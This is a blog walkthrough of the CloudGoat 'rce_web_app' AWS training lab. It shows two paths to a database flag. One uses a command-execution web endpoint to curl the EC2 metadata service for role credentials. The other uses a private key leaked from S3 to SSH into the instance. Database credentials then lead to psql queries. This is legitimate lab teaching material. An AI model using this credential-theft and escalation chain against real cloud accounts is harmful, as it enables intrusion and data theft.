+++
title = 'Hands on Cloud Pentesting: 8 - Cloudgoat rce_web_app'
date = 2025-06-24T16:01:44+05:30
draft = false
series = "Hands on Cloud Pentesting"
tags = ["cloud","aws"]
+++

<!--more-->

## rce_web_app (Hard)

[Scenario Page](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/rce_web_app/README.md)
### Description
Starting as the IAM user Lara, the attacker explores a Load Balancer and S3 bucket for clues to vulnerabilities, leading to an RCE exploit on a vulnerable web app which exposes confidential files and culminates in access to the scenario’s goal: a highly-secured RDS database instance.

Alternatively, the attacker may start as the IAM user McDuck and enumerate S3 buckets, eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.

### Scenario Goal(s)
Find a secret stored in the RDS database.

### Solution
Start the scenario
```bash
cloudgoat create rce_web_app
```
{{< details summary="Fix deployment errors" >}}
When deploying this scenario I got the following error:
```bash
Error: Your query returned no results. Please change your search criteria and try again.
│
│   with data.aws_ami.ubuntu,
│   on data_sources.tf line 4, in data "aws_ami" "ubuntu":
│    4: data "aws_ami" "ubuntu" {
│
```
If we look at cloudgoat's github page, we can see that there exists an issue which talks about this same error - [https://github.com/RhinoSecurityLabs/cloudgoat/issues/362](https://github.com/RhinoSecurityLabs/cloudgoat/issues/362).
A [fix](https://github.com/RhinoSecurityLabs/cloudgoat/pull/365) for this has been to update the ubuntu version and a couple of other changes but I wasn't able to just `pipx updgrade cloudgoat` to pull the latest version of all scenarios. I ended up doing the following steps to replace all scenario files direct from the latest commit.
```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
rm -rf /home/nsp/.local/pipx/venvs/cloudgoat/lib/python3.11/site-packages/cloudgoat/scenarios
cp -r cloudgoat/scenarios /home/nsp/.local/pipx/venvs/cloudgoat/lib/python3.11/site-packages/cloudgoat/
```
{{< /details >}}

![got creds](image.png)
In this scenario, we have 2 paths to exploit - we can start as the IAM user Lara or the IAM user McDuck.

#### IAM User Lara
After setting up profile for lara user, we can try to enumerate any iam permissions but it seems like this user does not have any list permission on any iam resource. Trying to list out s3 buckets gives us some results
```bash
# aws s3 ls --profile lara
2025-06-24 16:55:47 cg-keystore-s3-bucket-cgidxq4mbd0d1n
2025-06-24 16:55:48 cg-logs-s3-bucket-cgidxq4mbd0d1n
2025-06-24 16:55:48 cg-secret-s3-bucket-cgidxq4mbd0d1n
2025-05-28 16:16:16 elasticbeanstalk-us-east-1-1234567890
```
![s3 list lara](image-1.png)
We can see that we only have list permissions on one bucket `cg-logs-s3-bucket-cgidxq4mbd0d1n`. In this bucket, we can see 2 files
![found 2 files](image-2.png)

Using the following commands, we can copy them to our system.
```bash
aws s3 cp s3://cg-logs-s3-bucket-cgidxq4mbd0d1n/cg-lb-logs/AWSLogs/1234567890/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile lara
aws s3 cp s3://cg-logs-s3-bucket-cgidxq4mbd0d1n/cg-lb-logs/AWSLogs/1234567890/ELBAccessLogTestFile . --profile lara
```
![log files](image-3.png)
From the log files, we can get a URL - http://cg-lb-cgidxq4mbd0d1n-500781792.us-east-1.elb.amazonaws.com:80/mkja1xijqf0abo1h9glg.html which seems to be that of an elastic load balancer and the special endpoint `/mkja1xijqf0abo1h9glg.html` gives us access to run commands.

![command execution](image-4.png)
Using command execution we can exploit the [metadata service](https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/) to get credentials.
![curl metadata](image-5.png)
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidxq4mbd0d1n
```
Once we set-up the new credentials we can see that we have now assumed a different role
```bash
# aws sts get-caller-identity --profile laradone
{
    "UserId": "AROASA4MJEJAL2HOWZYOZ:i-09db21655fdec5238",
    "Account": "1234567890",
    "Arn": "arn:aws:sts::1234567890:assumed-role/cg-ec2-role-cgidxq4mbd0d1n/i-09db21655fdec5238"
}
```
Using this role, we are able to access another s3 bucket which we found earlier but did not have access to - `cg-secret-s3-bucket-cgidxq4mbd0d1n`. In this bucket there is a db.txt file which contains a username and a passsword.
![found password](image-6.png)
Since our goal is to find the secret in the RDS database, we can try listing the available RDS databases.
```json
// aws rds describe-db-instances --profile laradone --region us-east-1
{
    "DBInstances": [
        {
            "DBInstanceIdentifier": "cg-rds-instance-cgidxq4mbd0d1n",
            "DBInstanceClass": "db.t3.micro",
            "Engine": "postgres",
            "DBInstanceStatus": "available",
            "MasterUsername": "cgadmin",
            "DBName": "cloudgoat",
            "Endpoint": {
                "Address": "cg-rds-instance-cgidxq4mbd0d1n.ca94m8eqyhd5.us-east-1.rds.amazonaws.com",
                "Port": 5432,
                "HostedZoneId": "Z2R2ITUGPM61AM"
            },
            "AllocatedStorage": 20,
            "InstanceCreateTime": "2025-06-24T11:29:02.530Z",
            "PreferredBackupWindow": "09:06-09:36",
            "BackupRetentionPeriod": 0,
            "DBSecurityGroups": [],
            "VpcSecurityGroups": [
                {
                    "VpcSecurityGroupId": "sg-0e1f5ba777bb0bf31",
                    "Status": "active"
                }
            ],
            "DBParameterGroups": [
                {
                    "DBParameterGroupName": "default.postgres17",
                    "ParameterApplyStatus": "in-sync"
                }
            ],
            "AvailabilityZone": "us-east-1a",
            "DBSubnetGroup": {
                "DBSubnetGroupName": "cloud-goat-rds-subnet-group-cgidxq4mbd0d1n",
                "DBSubnetGroupDescription": "CloudGoat cgidxq4mbd0d1n Subnet Group",
                "VpcId": "vpc-04dccb71fb043638f",
                "SubnetGroupStatus": "Complete",
                "Subnets": [
                    {
                        "SubnetIdentifier": "subnet-0fc6939ac2650ab07",
                        "SubnetAvailabilityZone": {
                            "Name": "us-east-1a"
                        },
                        "SubnetOutpost": {},
                        "SubnetStatus": "Active"
                    },
                    {
                        "SubnetIdentifier": "subnet-06ae537ac41fa3da2",
                        "SubnetAvailabilityZone": {
                            "Name": "us-east-1b"
                        },
                        "SubnetOutpost": {},
                        "SubnetStatus": "Active"
                    }
                ]
            },
            "PreferredMaintenanceWindow": "tue:05:39-tue:06:09",
            "PendingModifiedValues": {},
            "MultiAZ": false,
            "EngineVersion": "17.4",
            "AutoMinorVersionUpgrade": true,
            "ReadReplicaDBInstanceIdentifiers": [],
            "LicenseModel": "postgresql-license",
            "OptionGroupMemberships": [
                {
                    "OptionGroupName": "default:postgres-17",
                    "Status": "in-sync"
                }
            ],
            "PubliclyAccessible": false,
            "StorageType": "gp2",
            "DbInstancePort": 0,
            "StorageEncrypted": false,
            "DbiResourceId": "db-Y3L5YY3SKBU2XCHF2ZVJ5JCISQ",
            "CACertificateIdentifier": "rds-ca-rsa2048-g1",
            "DomainMemberships": [],
            "CopyTagsToSnapshot": false,
            "MonitoringInterval": 0,
            "DBInstanceArn": "arn:aws:rds:us-east-1:1234567890:db:cg-rds-instance-cgidxq4mbd0d1n",
            "IAMDatabaseAuthenticationEnabled": false,
            "DatabaseInsightsMode": "standard",
            "PerformanceInsightsEnabled": false,
            "DeletionProtection": false,
            "AssociatedRoles": [],
            "TagList": [
                {
                    "Key": "Scenario",
                    "Value": "rce-web-app"
                },
                {
                    "Key": "Stack",
                    "Value": "CloudGoat"
                }
            ],
            "CustomerOwnedIpEnabled": false,
            "ActivityStreamStatus": "stopped",
            "BackupTarget": "region",
            "NetworkType": "IPV4",
            "StorageThroughput": 0,
            "CertificateDetails": {
                "CAIdentifier": "rds-ca-rsa2048-g1",
                "ValidTill": "2026-06-24T11:28:15Z"
            },
            "DedicatedLogVolume": false,
            "IsStorageConfigUpgradeAvailable": false,
            "EngineLifecycleSupport": "open-source-rds-extended-support"
        }
    ]
}
```

This gives us the address and the port using which we can connect to the postgresql database. The database is not exposed to the public so at this point we either need to get a reverse shell or execute psql commands from within the webshell itself.

```bash
# list tables
psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-cgidxq4mbd0d1n.ca94m8eqyhd5.us-east-1.rds.amazonaws.com:5432/cloudgoat -c '\dt'
# get data from table
psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-cgidxq4mbd0d1n.ca94m8eqyhd5.us-east-1.rds.amazonaws.com:5432/cloudgoat -c 'select * from sensitive_information;'
```
![got flag](image-7.png)

---

#### IAM User McDuck

This use has ListBucket permission only on the bucket `cg-keystore-s3-bucket-cgidxq4mbd0d1n` which contains a public key and a private key. Using the following command, we can download both the files.
```bash
aws s3 sync s3://cg-keystore-s3-bucket-cgidxq4mbd0d1n . --profile mcduck
```
This private key may be useful for us to connect to any EC2 instances that are using this key pair. We can list the EC2 instances.
```json
// aws ec2 describe-instances --profile mcduck --region us-east-1
{
    ...
    "NetworkInterfaces": [
        {
            "Association": {
                "IpOwnerId": "amazon",
                "PublicDnsName": "ec2-52-70-25-168.compute-1.amazonaws.com",
                "PublicIp": "52.70.25.168"
            },
    ...

```
This gives us an ip address and using the private key we got earlier, we are able to ssh into the EC2 instance.
```bash
chmod 700 cloudgoat
ssh -i cloudgoat ubuntu@52.70.25.168
```

From here, we can run the same curl command to get credentials from the metadata service.
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidxq4mbd0d1n
```

With this credentials we can find the same db.txt in an s3 bucket and then find out the rds endpoint url using which we connect to the postgresql database and get the flag.

```bash
# list tables
psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-cgidxq4mbd0d1n.ca94m8eqyhd5.us-east-1.rds.amazonaws.com:5432/cloudgoat -c '\dt'
# get data from table
psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-cgidxq4mbd0d1n.ca94m8eqyhd5.us-east-1.rds.amazonaws.com:5432/cloudgoat -c 'select * from sensitive_information;'
```
![got flag again](image-8.png)

> Flag = V!C70RY-4hy2809gnbv40h8g4b

Stop the scenario
```bash
cloudgoat destroy rce_web_app
```
